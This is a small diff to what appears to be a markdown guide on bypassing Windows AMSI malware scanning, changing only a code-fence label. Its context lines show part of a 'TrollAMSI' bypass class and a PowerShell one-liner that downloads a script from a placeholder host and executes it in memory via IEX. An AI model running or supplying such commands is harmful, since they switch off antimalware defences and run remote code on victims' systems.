@@ -18,7 +18,7 @@ class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime
 
 Or load into memory:
 
-```
+```bash
 (New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/amsi{$}.txt') | IEX
 ```
 
